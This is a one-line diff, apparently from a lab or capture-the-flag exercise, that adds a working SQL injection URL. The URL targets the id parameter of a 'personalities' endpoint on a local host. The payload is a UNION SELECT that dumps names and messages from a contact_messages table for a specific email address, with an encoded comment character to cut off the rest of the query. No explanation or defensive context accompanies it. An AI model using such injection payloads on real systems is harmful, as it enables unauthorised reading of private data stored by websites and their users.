@@ -1,0 +1,1 @@
+0.0.0.0/personalities?id=10' UNION SELECT name,message from contact_messages WHERE mail='james@bond.mi5'%23
